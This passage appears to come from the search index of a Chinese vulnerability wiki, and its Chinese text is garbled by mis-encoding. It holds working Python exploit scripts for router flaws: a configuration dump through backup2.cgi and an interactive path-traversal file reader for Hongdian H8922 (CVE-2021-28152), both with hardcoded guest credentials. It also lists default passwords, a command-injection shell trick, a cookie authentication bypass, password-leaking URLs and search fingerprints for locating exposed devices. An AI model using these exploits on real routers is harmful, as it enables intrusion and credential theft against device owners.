print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/backup2.cgi\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/backup2.cgi.... \\033[0m\".format(target_url)) if 'service webadmin' in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,Â≠òÂú®ËÆøÂÆ¢Ë¥¶Âè∑ guest/guest ÊàêÂäüËØªÂèñÈÖçÁΩÆÊñá‰ª∂ \\033[0m\".format(target_url)) print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/ÂÆèÁîµ H8922 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-28152.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/ÂÆèÁîµ/ÂÆèÁîµ H8922 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-28152.html","title":"ÂÆèÁîµ H8922 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-28152","keywords":"","body":"ÂÆèÁîµ H8922 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-28152 ÊºèÊ¥ûÊèèËø∞ ÂÆèÁîµ H8922 ÂêéÂè∞Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºå‰ΩéÊùÉÈôêÁî®Êà∑ÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑Âèñ‰ªªÊÑèÊñá‰ª∂ÂÜÖÂÆπ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂÆèÁîµ H8922 ZoomEy [!NOTE] app:\"Hongdian H8922 Industrial Router\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÂè∞(Â≠òÂú®ËÆøÂÆ¢Áî®Êà∑ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å guest/guest) ÊºèÊ¥ûÂ≠òÂú®‰∫é log_download.cgi Êñá‰ª∂‰∏≠ ‰ΩøÁî®typeÂèÇÊï∞ËØªÂèñÊñá‰ª∂Âπ∂‰∏ãËΩΩÊó•ÂøóÁªôÁî®Êà∑Ôºå‰ΩøÁî® ../../ ÂèØ‰ª•Ë∑≥ËΩ¨Ê†πÁõÆÂΩïËØªÂèñ‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûPOC import requests import sys import random import re from lxml import etree from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : ÂÆèÁîµ H8922 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CVE-2021-28152 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, filename): vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/log_download.cgi?type=../../etc/passwd \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,Â≠òÂú®ËÆøÂÆ¢Ë¥¶Âè∑ guest/guest ÊàêÂäüËØªÂèñ /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: filename = input(\"\\033[35mFilename >>> \\033[0m\") if filename == \"exit\": sys.exit(0) else: POC_2(target_url, filename) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, filename): vuln_url = target_url + \"/log_download.cgi?type=../..{}\".format(filename) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] {} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() filename = '/etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, filename) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Á¢ßÊµ∑Â®Å/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Á¢ßÊµ∑Â®Å/","title":"Á¢ßÊµ∑Â®Å","keywords":"","body":"Á¢ßÊµ∑Â®Å Á¢ßÊµ∑Â®Å L7Â§öÊ¨æ‰∫ßÂìÅ ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Á¢ßÊµ∑Â®Å/Á¢ßÊµ∑Â®Å L7Â§öÊ¨æ‰∫ßÂìÅ ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Á¢ßÊµ∑Â®Å/Á¢ßÊµ∑Â®Å L7Â§öÊ¨æ‰∫ßÂìÅ ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Á¢ßÊµ∑Â®Å L7Â§öÊ¨æ‰∫ßÂìÅ ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Á¢ßÊµ∑Â®Å L7Â§öÊ¨æ‰∫ßÂìÅ ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Á¢ßÊµ∑Â®Å L7Â§öÊ¨æ‰∫ßÂìÅÂ≠òÂú® ÂêéÂè∞ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáË¥¶Âè∑ÂØÜÁ†ÅÁôªÂΩïÂêéÂè∞ÂêéÔºåÈÄöËøáÂëΩ‰ª§ÊãºÊé•ÈÄ†ÊàêÂëΩ‰ª§Ê≥®ÂÖ• ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Á¢ßÊµ∑Â®Å L7Â§öÊ¨æ‰∫ßÂìÅ FOFA [!NOTE] \"Á¢ßÊµ∑Â®Å\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÈªòËÆ§ÂØÜÁ†Å‰∏∫ adimn/admin or admin123 ÊºèÊ¥ûÂ≠òÂú®‰∫é ÂëΩ‰ª§ÊéßÂà∂Âè∞‰∏≠ÔºåÂÖ∂‰∏≠Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ• ÂèØ‰ª•‰ΩøÁî® help & sh ÂæóÂà∞‰∫§‰∫íÂºèÂëΩ‰ª§ÂÜôÂÖ•ÊÅ∂ÊÑèÊñá‰ª∂ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Á£äÁßë/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Á£äÁßë/","title":"Á£äÁßë","keywords":"","body":"Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Á£äÁßë/Á£äÁßë NI360Ë∑ØÁî±Âô® ËÆ§ËØÅÁªïËøáÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/Á£äÁßë/Á£äÁßë NI360Ë∑ØÁî±Âô® ËÆ§ËØÅÁªïËøáÊºèÊ¥û.html","title":"Á£äÁßë NI360Ë∑ØÁî±Âô® ËÆ§ËØÅÁªïËøáÊºèÊ¥û","keywords":"","body":"Á£äÁßë NI360Ë∑ØÁî±Âô® ËÆ§ËØÅÁªïËøáÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Á£äÁßë NI360Ë∑ØÁî±Âô® Â≠òÂú®ËÆ§ËØÅÁªïËøáÊºèÊ¥ûÔºåÈÄöËøáÊ∑ªÂä†ÁâπÂÆöÁöÑCookieÂ≠óÊÆµËé∑ÂèñÂêéÂè∞ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç Á£äÁßë NI360Ë∑ØÁî±Âô® FOFA [!NOTE] title=\"Netcore\" ÊºèÊ¥ûÊèèËø∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Ê∑ªÂä† CookieÂ≠óÊÆµ : netcore_login=guest:1 Âà∑Êñ∞ÂêéÁôªÂΩïÂêéÂè∞ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÂõΩÁßªÂä®/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÂõΩÁßªÂä®/","title":"‰∏≠ÂõΩÁßªÂä®","keywords":"","body":"‰∏≠ÂõΩÁßªÂä® ‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± simple-index.asp Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÂõΩÁßªÂä®/‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± ExportSettings.sh ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÂõΩÁßªÂä®/‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± ExportSettings.sh ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± ExportSettings.sh ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± ExportSettings.sh ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± ExportSettings.sh Â≠òÂú®ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûËé∑ÂèñÈÖçÁΩÆÊñá‰ª∂ÔºåÂÖ∂‰∏≠ÂåÖÂê´Ë¥¶Âè∑ÂØÜÁ†ÅÁ≠âÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± FOFA [!NOTE] title=\"‰∫íËÅî‰∏ñÁïå Áâ©ËÅîÊú™Êù•-ÁôªÂΩï\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËÆøÈóÆUrl /cgi-bin/ExportSettings.sh ÂÖ∂‰∏≠password‰∏∫ÁôªÂΩïÂêéÂè∞ÂØÜÁ†Å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÂõΩÁßªÂä®/‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± simple-index.asp Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/‰∏≠ÂõΩÁßªÂä®/‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± simple-index.asp Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± simple-index.asp Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û","keywords":"","body":"‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± simple-index.asp Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± simple-index.asp Â≠òÂú®Ë∂äÊùÉËÆøÈóÆÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñË¥¶Âè∑ÂØÜÁ†ÅÁ≠âÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰∏≠ÂõΩÁßªÂä® Á¶πË∑ØÁî± FOFA [!NOTE] title=\"‰∫íËÅî‰∏ñÁïå Áâ©ËÅîÊú™Êù•-ÁôªÂΩï\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ËÆøÈóÆUrl /simple-index.asp ‚Äã Ë∂äËøáÁÆ°ÁêÜÂëòÈ™åËØÅËé∑ÂèñWiflË¥¶Âè∑ÂØÜÁ†ÅÁ≠â‰ø°ÊÅØ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "}}